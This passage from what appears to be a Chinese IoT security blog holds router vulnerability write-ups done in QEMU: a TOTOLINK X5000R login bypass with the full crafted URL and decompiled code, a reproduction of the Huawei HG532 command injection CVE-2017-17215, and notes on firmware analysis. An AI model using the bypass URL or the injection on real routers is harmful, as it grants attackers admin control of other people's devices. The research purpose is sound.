    <content type="html"><![CDATA[<p>型号：<a href="http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=65">X5000R</a></p><p><a href="http://www.totolink.cn/home/menu/newstpl.html?menu_newstpl=products&id=65">AX1800 无线双频千兆路由器</a></p><p>下面有分析思路，设备模拟过程比较靠近新手，师傅们可以直接跳到后面分析过程。</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140113553.png" alt="image-20220402140113553"></p><p>登陆页面构造参数，无需密码</p><p><a href="http://192.168.0.1/formLoginAuth.htm?authCode=1&userName=admin&goURL=home.html&action=login">formLoginAuth.htm?authCode&#x3D;1&amp;action&#x3D;login</a></p><p>可直接绕过登陆，进入后台</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140132386.png" alt="image-20220402140132386"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140143666.png" alt="image-20220402140143666"></p><p>产生原因在lighttpd wen服务文件from_login函数中</p><p> <img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140151857.png" alt="image-20220402140151857"></p><div class="code-wrapper"><pre><code class="hljs c++"> <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;  iVar1 = <span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span> *)&amp;sa58,<span class="hljs-string">&quot;ie8&quot;</span>);  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;   pcVar1 = <span class="hljs-string">&quot;/login_ie.html&quot;</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;   iVar1 = <span class="hljs-built_in">atoi</span>((<span class="hljs-type">char</span> *)&amp;sa58);   <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;​    pcVar2 = <span class="hljs-string">&quot;/login.html&quot;</span>;​    pcVar1 = <span class="hljs-string">&quot;http://%s%s%s&quot;</span>;​    pcVar3 = <span class="hljs-string">&quot;/phone&quot;</span>;LAB_409114:​    <span class="hljs-built_in">sprintf</span>(param_2,pcVar1,acStack1860,pcVar3,pcVar2);​    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;   &#125;   pcVar1 = <span class="hljs-string">&quot;/login.html&quot;</span>;  &#125;  <span class="hljs-built_in">sprintf</span>(param_2,<span class="hljs-string">&quot;http://%s%s&quot;</span>,acStack1860,pcVar1);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;</code></pre></div><p>上面代码是登陆检查，当iVar2&#x3D;1的时候，直接跳过检查，不需要登陆。</p><p>iVar2的值是autoCode参数的值。</p><p>所以构造autoCode&#x3D;1即可绕过。</p><hr><h2 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h2><p>下面是详细分析思路。</p><p>今天偶然发现这款非常小众的路由器，至于多小众，我分析这款官方月销15台。</p><p>我分析的这款是 AX1800，官方可以直接下载固件。</p><p>这款固件超级适合新手第一次分析使用。</p><p>binwalk分析</p><div class="code-wrapper"><pre><code class="hljs bash">binwalk TOTOLINK_C8343R-1C_X5000R_IP04433_MT7621A_SPI_16M256M_V9.1.0u.6118_B20201102_ALL.web</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140204590.png" alt="image-20220402140204590"></p><p>squashfs文件系统，uImage，LZMA压缩文件中应该也是个比较大的内容，直接使用-Me参数递归提取。</p><div class="code-wrapper"><pre><code class="hljs bash">binwalk -Me TOTOLINK_C8343R-1C_X5000R_IP04433_MT7621A_SPI_16M256M_V9.1.0u.6118_B20201102_ALL.web</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140212668.png" alt="image-20220402140212668"></p><p>里面有标准的文件系统</p><p>查看架构</p><div class="code-wrapper"><pre><code class="hljs bash">binwalk ./bin/busybox</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140219607.png" alt="image-20220402140219607"></p><p>mips小端序，查看其文件系统瞅瞅有没有什么东西。</p><p>有个工具叫firmwalker，可以自动分析文件系统，提取重要文件，我个人觉得不是特别好用。</p><p>我比较推荐使用vscode来做分析。</p><p>下面是要关注的一些地方</p><div class="code-wrapper"><pre><code class="hljs bash">etc/ <span class="hljs-comment">#这里会存放系统启动文件如openwrt的rcS文件</span>sbin/ <span class="hljs-comment">#这里一般会存放厂商制作的功能性文件和提供web服务的文件</span>www/ <span class="hljs-comment">#这里会存放一些web静态页面和后台服务文件文件</span></code></pre></div><p>其他地方也尽量看一下，经验多了就容易清楚哪些文件是做什么的了，没经验就慢慢来。</p><p>这里发现了这几个文件：</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140228610.png" alt="image-20220402140228610"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140234876.png" alt="image-20220402140234876"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140239433.png" alt="image-20220402140239433"></p><p>可以看到他使用了lighttpd 的web服务文件，</p><p>一般固件大概会有这几个轻量级httpd文件：lighttpd，httpd，uhppd。</p><p>  其他的还有很多。</p><p>尝试使用qemu-user模拟http服务。</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> (<span class="hljs-built_in">which</span> qemu-mipsel-static) ./sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./usr/sbin/lighttpd</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140244941.png" alt="image-20220402140244941"></p><p>这里的报错是需要用-f参数指定配置文件，上面已经发现了lighttpd.conf文件。</p><div class="code-wrapper"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> . ./qemu-mipsel-static ./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140250832.png" alt="image-20220402140250832"></p><p>没有这个文件，这里我们先去把这个路径改一下，在lighttpd.conf中</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140256520.png" alt="image-20220402140256520"></p><p>把它改到固件的系统文件中<code>./var/run/lighttpd.pid</code>，并且去创建这个文件。</p><p>运行</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140301896.png" alt="image-20220402140301896"></p><p>这里虽然正常启动，但是如果不挂载文件夹，还是挺多问题的，所以我更倾向使用系统模式。</p><p>所以下面的分析都是在系统模式下的。</p><p>这里系统模式不做赘述，我写了个脚本，可以很方便启动。</p><p>核心文件比较大，大家按文件自行下载</p><p><a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a></p><p>我把脚本放链接放这里</p><p><a href="https://gitee.com/p1piyang/backward-analysis/tree/master/">https://gitee.com/p1piyang/backward-analysis/tree/master/</a></p><p>qemu启动</p><div class="code-wrapper"><pre><code class="hljs bash">sudo ./start-mipsel.sh</code></pre></div><p>sudo 启动</p><div class="code-wrapper"><pre><code class="hljs bash">ifconfig eth0 192.168.5.12 up <span class="hljs-comment">#qemu中设置ip，qemu里边</span></code></pre></div><p>将文件系统上传</p><div class="code-wrapper"><pre><code class="hljs bash">scp -r squashfs-root/ root@192.168.5.12:/root/  <span class="hljs-comment">#在主机</span></code></pre></div><p>挂载</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">chroot</span> ./squashfs-root/ /bin/sh</code></pre></div><p>启动</p><div class="code-wrapper"><pre><code class="hljs bash">./user/sbin/lighttpd -f ./lighttp/lighttpd.conf</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140309147.png" alt="image-20220402140309147"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>刚开始是想直接去分析lighttpd的。随手登陆了一下，看了下包。</p><blockquote><p> 我个人浅薄的经验，不要单纯去无目的的分析某个应用，我之前犯过这种错误，太容易对着一个程序漫无目的的乱逛，希望你没有这种情况。</p></blockquote><p>这里明显可以看到调用了cgi文件，之前看文件的时候看到了这个东西的。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140319324.png" alt="image-20220402140319324"></p><p>可以去分析下这个文件。</p><div class="code-wrapper"><pre><code class="hljs sql">ghidra <span class="hljs-keyword">open</span>！！！Link 死大头！！！<span class="hljs-keyword">search</span> &quot;action&quot;！！！</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140324232.png" alt="image-20220402140324232"></p><p>action&#x3D;login，交叉引用，看一下。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140332012.png" alt="image-20220402140332012"></p><p>说实话，ghidra的这个伪代码看着老奇怪了，这里是判断了登陆还是升级。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140340535.png" alt="image-20220402140340535"></p><p>if下面，这里判断flag&#x3D;1，最后的逻辑是将字符串格式化到<code>acStack4456</code>中</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140405176.png" alt="image-20220402140405176"></p><p>再往下这个地方我刚开始比较懵了，因为<code>websGetVar程序查找表变量var</code>,相当于获取参数。所以这里并没有往下看，而是换了个思路点。</p><p>这里知道了他是对登陆做了个判断。</p><p>去查找登陆的请求参数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140416345.png" alt="image-20220402140416345"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140422127.png" alt="image-20220402140422127"></p><p>发现了这么个地方。</p><p>根据登陆的包。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140429266.png" alt="image-20220402140429266"></p><p>发现他返回了一串地址。并且主动访问了这串地址。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140435525.png" alt="image-20220402140435525"></p><p>所以这个地方是判断密码的地方。本来想试试正确密码，来分析下，结果密码怎么都不对。</p><p>这里解释下，因为我没有设备，是直接在官网下载的固件，所以这个密码怎么都不对，我怀疑是固件模拟的问题，就没有往下追究。</p><p>他主动访问了formloginAuth.htm，在www&#x2F;文件夹下并没有这个文件，所以去找下lighttpd文件分析下</p><div class="code-wrapper"><pre><code class="hljs sql">ghidra <span class="hljs-keyword">open</span>！！！Link 死大头！！！<span class="hljs-keyword">search</span> &quot;formLoginAuth&quot;！！！</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140442157.png" alt="image-20220402140442157"></p><p>跟进from_Login函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140458964.png" alt="image-20220402140458964"></p><p>这里就发现了参数处理</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140507794.png" alt="image-20220402140507794"></p><p>判断几个参数做了什么，userName是空的先不看，goURL是某个html文件，盲猜他是的从哪来的，action是要做什么。</p><p>所以现在要看一下authCode</p><p>如果authCode不等于0，iVar2就等于整形的authCode的值。</p><p>往下分析。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140512311.png" alt="image-20220402140512311"></p><p>这里改成1之后直接，跳过了这个判断。</p><p>但是只吧这个改为1之后还是返回到登陆界面。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140520920.png" alt="image-20220402140520920"></p><p>这里pcVar2&#x3D;1，导致跳过了设置pcVar2 &#x3D; home.html</p><p>所以我猜测goUrl参数不是从哪来，而是从哪去。</p><p>最后发现果然是哦。</p><p>其实在ghidra反编译的时候，好多地方不太习惯，很多地方靠函数名和字符串硬猜。</p><p>慢慢来吧。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>iot学习感悟</title>
    <link href="/article/41f88cb3.html"/>
    <url>/article/41f88cb3.html</url>
    
    <content type="html"><![CDATA[<h1 id="关于加密"><a href="#关于加密" class="headerlink" title="关于加密"></a>关于加密</h1><p>前期接触iot我们遇到固件基本都是binwalk一把梭，但有时候会遇到固件信息混乱，或者分析出来一堆zlma的文件，没有发现有rtos或者文件系统的标志。</p><p>这时候会考虑到是否加密，上网查会发现有用 binwalk 的 -E 参数来判断。</p><p>那么这个判断的原理是啥？</p><p>原理是信息熵。</p><blockquote><p> 熵：泛指某些物质系统状态的一种量度，某些物质系统状态可能出现的程度。</p></blockquote><p>初高中应该都学过，熵值越大，说明系统越混乱。</p><blockquote><p> 信息熵：1948年C.E.Shannon（香农）从热力学中借用过来提出的概念，解决了对信息的量化度量问题</p></blockquote><p>信息中，重复的内容越多，系统越稳定，能获得的信息越多。</p><blockquote><p>对于没有加密的二进制文件来说，某些指令出现的频率通常很高（如序言、nop序列等），并且数据结构几乎没有随机性。重复概率很高</p></blockquote><p>所以，对于未加密的数据来说熵值一般会比较低。</p><blockquote><p>对于经过加密的文件来说，都会想尽办法隐藏自己的信息，而导致很少有重复的内容，也就导致重复概率低</p></blockquote><p>所以，加密的熵值一般都会高。</p><p>上面就是通过信息熵来判断是否加密，binwalk使用相关算法来整理信息熵</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140534018.png" alt="image-20220402140534018"></p><h1 id="关于web服务"><a href="#关于web服务" class="headerlink" title="关于web服务"></a>关于web服务</h1><p>嵌入式的web服务通常是cgi+http 或 lua+http</p><p>cgi是叫公共网关接口，是Web 服务器运行时外部程序的规范，按<em>CGI</em> 编写的程序可以扩展服务器功能</p><p><em>Lua</em> 是一种轻量小巧的脚本语言,用标准C语言编写并以源代码形式开放, 其设计目的是为了嵌入应用程序中,从而为应用程序提供灵活的扩展和定制功能。</p><p>常见的嵌入式设备使用的web服务多为以下几款</p><h2 id="boa"><a href="#boa" class="headerlink" title="boa"></a>boa</h2><p>单一任务型的http服务器，只会对CGI请求进行<code>fork</code>进程，没有访问控制功能，身份认证都是厂商后边开发的。</p><p>通过<code>translate_uri</code>函数解析请求路径I判断是否为CGI请求，调用<code>init_cgi</code>来<code>execve</code>执行相关CGI程序</p><p><code>translate_uri</code>函数中的<code>init_script_alias</code>函数，负责解析<code>ScriptAlias</code>请求，设置请求cgi类型，查看文件是否存在以及具有相关权限</p><p>通过<code>ScriptAlias</code>在<code>boa.conf</code>配置文件中，该指令设置CGI执行的真实目录</p><blockquote><p>不止是boa，nginx的设置中也存在alias，小米路由器就曾因为这个设置导致路径穿越</p></blockquote><h2 id="uhttpd"><a href="#uhttpd" class="headerlink" title="uhttpd"></a>uhttpd</h2><p>openwrt的默认http服务器，主要是为了和LucI Web接口方便OpenWrt设备管理。</p><p>支持与cgi，lua，UBUS来完成请求。</p><p>uhttpd使用LuCI框架编写lua处理脚本，安全审计偏向于Web安全中的代码审计。</p><p>但也有一些存放的lua脚本是编译过的，需要逆向。</p><p>uhttp下<code>dispatch_find</code>函数根据请求的url找到合适的<code>dispatch_handler</code>。</p><p>请求的url通过<code>check_cgi_path</code>函数校验，则会调用<code>cgi_handle_request</code>函数回调<code>cgi_main</code>函数<code>execl</code>执行对应的CGI程序</p><p>最终调用的<code>/www/cgi-bin/luci</code>即Luci，luci是MVC设计思想的web后端框架。</p><p>简单了解下，后面一款小米路由器分析思路会详细介绍</p><h2 id="Goahead"><a href="#Goahead" class="headerlink" title="Goahead"></a>Goahead</h2><p>在<code>route.txt</code>定义的路由规则，根据匹配的URI来执行不同的handler：有action handler直接在GoAhead进程中执行C函数，CGI handler执行新的CGI程序，也有默认的file handler处理文件请求，还可以自定义新的handler</p><p>详细请看官方文档：<a href="https://www.embedthis.com/goahead/doc/">https://www.embedthis.com/goahead/doc/</a></p><p>调用<code>websUrlHandlerRequest</code>函数找到匹配URL前缀的处理函数，可以借助<code>websFormDefine</code>函数定义与<code>formName</code>相关联的C处理函数</p><p>由上面几个可以看出来，都是通过URL来选择执行CGI&#x2F;lua或是内部程序</p><p>并且根据<code>PATH_INFO</code>选择执行程序内最终的handler函数。</p><p>这里属于个人复述，这个文章比较详细：<a href="https://github.com/Larryxi/Larryxi.github.io/blob/master/_posts/2020-02-03-iot-web-server-cgi-handler-analysis.md">https://github.com/Larryxi/Larryxi.github.io/blob/master/_posts/2020-02-03-iot-web-server-cgi-handler-analysis.md</a></p><h1 id="分析的一些思路"><a href="#分析的一些思路" class="headerlink" title="分析的一些思路"></a>分析的一些思路</h1><p>分析的话根据上面的东西来看</p><p>一定要有个设备，或者去模拟这些设备。</p><p>保证正常的web访问，方便查看功能调用的url&#x2F;接口。</p><blockquote><p>一定不要去公网站直接用人家的设备，要做个守法的好孩子！！！</p></blockquote><p>根据上面的知识来获取相关功能的具体实现位置。</p><p>然后分析危险函数，以及是否可控。</p><p>或者</p><p>从危险函数向外分析功能点。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-17215(华为HG532远程命令执行漏洞)</title>
    <link href="/article/3a44f1fa.html"/>
    <url>/article/3a44f1fa.html</url>
    
    <content type="html"><![CDATA[<p>固件和exp都已经放在这个地方了：<a href="https://gitee.com/p1piyang/backward-analysis/tree/master/">https://gitee.com/p1piyang/backward-analysis/tree/master/</a></p><p>建议先通一遍文章再动手复现，复现之前一定要保存虚拟机快照，防止出现各种奇奇怪怪的问题</p><p>首先要解决环境问题，这里只做配置说明，iot分析环境专门有一篇，请去看<code>IOT固件分析环境搭建</code> 的binwalk，qemu</p><h1 id="解压固件"><a href="#解压固件" class="headerlink" title="解压固件"></a>解压固件</h1><p>直接使用<code>binwalk -Me HG532eV100R001C02B015_upgrade_main.bin</code>命令来直接解压固件文件</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140542176.png" alt="image-20220402140542176"></p><p>解压完成后，在固件同文件夹下可以看到解压出来的文件夹</p><p>文件夹中的<code>squashfs-root</code>就是我们需要的文件系统了，如果squashfs-root中没有下图的各种文件系统，就是你的binwalk有不完整，去看<code>iot固件分析环境搭建</code></p><h1 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h1><p>我们要让qemu虚拟机和我们的ubuntu互通。</p><p>安装网络配置工具</p><div class="code-wrapper"><pre><code class="hljs sh">apt-get install bridge-utils uml-utilities</code></pre></div><h5 id="修改ubuntu网络配置文件-etc-network-interfaces"><a href="#修改ubuntu网络配置文件-etc-network-interfaces" class="headerlink" title="修改ubuntu网络配置文件 /etc/network/interfaces/"></a>修改ubuntu网络配置文件 <code>/etc/network/interfaces/</code></h5><p>sudo vim 你一定会把！</p><p>内容改成如下，图下提供了复制粘贴的代码（贴心人）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140548936.png" alt="image-20220402140548936"></p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># interfaces(5) file used by ifup(8) and ifdown(8)</span>auto loiface lo inet loopbackauto ens33iface ens33 inet manualup ifconfig ens33 0.0.0.0 upauto br0iface br0 inet dhcpbridge_ports ens33bridge_maxwait 0</code></pre></div><h5 id="创建或修改qemu的网络接口启动文件脚本-etc-qemu-ifup"><a href="#创建或修改qemu的网络接口启动文件脚本-etc-qemu-ifup" class="headerlink" title="创建或修改qemu的网络接口启动文件脚本/etc/qemu-ifup"></a>创建或修改qemu的网络接口启动文件脚本<code>/etc/qemu-ifup</code></h5><p>如果没有这个文件直接创建就可以了，如果有的话将里边内容清空，然后写入下面脚本</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140556661.png" alt="image-20220402140556661"></p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><span class="hljs-comment"># Script to bring a network (tap) device for qemu up.</span><span class="hljs-comment"># The idea is to add the tap device to the same bridge</span><span class="hljs-comment"># as we have default routing to.</span><span class="hljs-comment"># in order to be able to find brctl</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Executing /etc/qemu-ifup&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Bringing <span class="hljs-variable">$1</span> for bridge mode...&quot;</span>sudo /sbin/ifconfig <span class="hljs-variable">$1</span> 0.0.0.0 promisc up<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Adding <span class="hljs-variable">$1</span> to br0...&quot;</span>sudo /sbin/brctl addif br0 <span class="hljs-variable">$1</span><span class="hljs-built_in">sleep</span> 3</code></pre></div><p>然后依次执行如下操作</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#启动桥接网络赋予可执行权限</span>sudo chmod a+x <span class="hljs-regexp">/etc/</span>qemu-ifup<span class="hljs-comment">#重启网络服务，使配置生效（注意这个地方配置正常之后，如果你是mac，可能会让你输入mac密码，windows我不知道😬）</span>sudo <span class="hljs-regexp">/etc/i</span>nit.d/networking restart<span class="hljs-comment">#关闭ens33，启动桥接网络br0（这里如果显示eth0不存在没关系，直接启动br0）</span>sudo ifdown eth0sudo ifup br0</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140603509.png" alt="image-20220402140603509"></p><p>如图所示，当前网卡为br0</p><p>配置完之后，如果下面qemu虚拟机配置之后，仍然无法获取ip，重启ubuntu</p><h1 id="配置qemu虚拟机"><a href="#配置qemu虚拟机" class="headerlink" title="配置qemu虚拟机"></a>配置qemu虚拟机</h1><p>先去下载debian-mips-qemu镜像文件，每次固件分析要注意对应大小端序的镜像文件（还是有设备的好😭）</p><p>下载地址：<a href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140611607.png" alt="image-20220402140611607"></p><p>我们需要红框里的两个文件，然后在文件所在地方启动qemu</p><blockquote><p>这里特别说明，最后一个参数<code>-nographic</code>带上是在终端中直接运行，不会弹出窗口运行，建议一定不要开，我这里开了之后这个窗口的返回快捷键和vmware的一模一样，就导致我只能在mac和qemu中间用，我回不去我的ubuntu了。</p></blockquote><div class="code-wrapper"><pre><code class="hljs sh">sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="hljs-string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic,macaddr=00:16:3e:00:00:01 -net tap -nographic</code></pre></div><blockquote><p> 如果你的多次运行qemu，可能会出现如下错误</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140619011.png" alt="image-20220402140619011"></p><p>这是服务没有退出导致的</p><p>ps查出当前qemu进程号，kill掉就好了</p><p>ps -e | grep ‘qemu’ </p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140624914.png" alt="image-20220402140624914"></p><p>sudo kill 3307</p><p>即可</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140630469.png" alt="image-20220402140630469"></p><p>启动如上图，账号密码都是root</p><p>启动后尝试，ping baidu.com 和 ubuntu</p><p>如果不通</p><div class="code-wrapper"><pre><code class="hljs sh">ifconfig -a</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140637098.png" alt="image-20220402140637098"></p><p>查看网卡第一个是什么，一般都会是<code>eth1</code></p><p>然后修改<code>/etc/network/interfaces</code>，注意这里是在qemu虚拟机中修改</p><div class="code-wrapper"><pre><code class="hljs awk">nano <span class="hljs-regexp">/etc/</span>network/interfaces</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140644738.png" alt="image-20220402140644738"></p><p>第一次配置红框中一般是eth0，将红框中的内容修改为你的网卡名字</p><p>保存后使用下面指令重启eth1</p><div class="code-wrapper"><pre><code class="hljs sh">ifup eth1</code></pre></div><p>再次尝试，如果还不行或者ifconfig发现eth1没有分配地址，重启ubuntu或者找原因🤔，不行就恢复快照</p><p>如果成了的话是可以用ssh远程连接qemu虚拟机的</p><div class="code-wrapper"><pre><code class="hljs sh">ssh root@虚拟机ip</code></pre></div><p>建议在ubuntu中使用ssh连接，比较方便</p><p>接下来将我们解压出来的文件系统拷贝到qemu</p><div class="code-wrapper"><pre><code class="hljs sh">scp -r ./squashfs-root  root@虚拟机ip:/root/</code></pre></div><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>通过checkpoint报告中能看到关键字为<code>ctrl</code>和<code>Deviceupgrade</code>，端口号为<code>37215</code></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/GzpgZHDk4ARtbdx.png" alt="image-20210902150556461"></p><p>使用grep来查找</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140700858.png" alt="image-20220402140700858"></p><p>两个都指向upnp这个文件，端口号指向mic这个文件</p><p>直接运行会出问题，我们切换根目录到拷贝进来的系统文件中</p><div class="code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">chroot</span> /root/squashfs-root /bin/sh</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140706608.png" alt="image-20220402140706608"></p><p>然后先后运行upnp和mic</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140714604.png" alt="image-20220402140714604"></p><p>到这个地方mic已经运行成功了，放着不用管他了</p><p>使用lsof -i:37215可以查看端口是否运行</p><p>用下面命令来查看是否启动成功</p><div class="code-wrapper"><pre><code class="hljs sh">nc -vv 192.168.150.9 37215</code></pre></div><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140722740.png" alt="image-20220402140722740"></p><p>成功了就可以跑exp了</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140729357.png" alt="image-20220402140729357"></p><p>与checkpoint不同的是，我把溢出的命令修改了（红框处，这里就是灵活使用了），蓝框处修改为qemu的ip</p><p>执行exp后 在mic界面可以看到</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140738261.png" alt="image-20220402140738261"></p><p>ls被成功执行了。</p><h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>Ida7.5可以反编译qemu🥳</p><p>通过exp能发现，命令行放在了NewStatusURL标签下，在ida中通过字符串查找</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140745136.png" alt="image-20220402140745136"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140751334.png" alt="image-20220402140751334"></p><p>49c的位置使用快捷间p可以创建函数，来反编译</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140806829.png" alt="image-20220402140806829"></p><p>snprintf函数将可变个参数按照format格式化成字符串，然后将其复制到str中，即把v5与前面字符串拼接放到v6中，并且system执行了v6</p><p>根据exp的执行效果来推测，ATP_XML_GetChildNodeByName这个函数读取NewStatusURL标签的内容放到了v5。</p><p>伪代码不可信，尽量还是通过汇编代码分析</p><p>倒推能发现，system的参数为<code>0x42C+var_414($sp)</code></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140813521.png" alt="image-20220402140813521"></p><p><code>0x42C+var_414($sp)</code>为snprintf 的第一个参数，<code>0x42C+var_40C($sp)</code>为snprintf的第四个参数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140822142.png" alt="image-20220402140822142"></p><p>即 <code>0x42C+var_40C($sp)</code>的内容通过函数放到了<code>0x42C+var_414($sp)</code></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402140829308.png" alt="image-20220402140829308"></p><p>而<code>0x42C+var_40C($sp)</code>为ATP_XML_GetChildNodeByName的一个参数，这里应该是读取后放到了<code>0x42C+var_40C($sp)</code></p><blockquote><p>ida的锅🙃，没有办法ATP_XML_GetChildNodeByName做具体分析，但通过网上一些师傅的文章，应该大差不差了</p></blockquote><p>然后了解原理我们就可以通过闭合来实现命令运行了。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tenda路由器的漏洞发现</title>
    <link href="/article/44df6587.html"/>
    <url>/article/44df6587.html</url>
    
    <content type="html"><![CDATA[<p>分析这款是tendaA1206，固件是比较早的未加密的那个。</p><p>都是些个人学习过程中的思考与知识，整理下来。</p><p>固件在这：<code>https://p1yang.github.io/2022/04/22/iot/tenda路由器的漏洞发现/</code></p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>都是些老生常谈的东西可以跳过。</p><p>这里使用的qemu-user，方便</p><p>至于分析的文件在下面思路中会聊到，这里环境模拟启动的是&#x2F;bin&#x2F;httpd 文件</p><p>复现环境是qemu+ghidra(反编译伪代码，我个人比较习惯ghidra的伪代码)+ida7.5(动态调试)</p><p>binwalk解包，文件格式，qemu-user模式启动等这些就不赘述，主要说几个环境模拟时的几个小问题。</p><h2 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422093901642.png" alt="image-20220422093901642"></p><p>第一次运行时爆出这个错误停止。string大法发现在main中</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422094037256.png" alt="image-20220422094037256"></p><p><code>apmib_init</code>函数从flash中读取mib值到RAM中，像这种模拟是办不到的东西，直接patch代码或更改寄存器值来绕过(尝试了下没办法直接patch代码，可以试试patch机器码，比较麻烦，我就直接改寄存器了)</p><p>在mips的判断是bne，btgz等，将断点下在他们上，他们通常依靠v0寄存器的值来做判断。</p><p><img 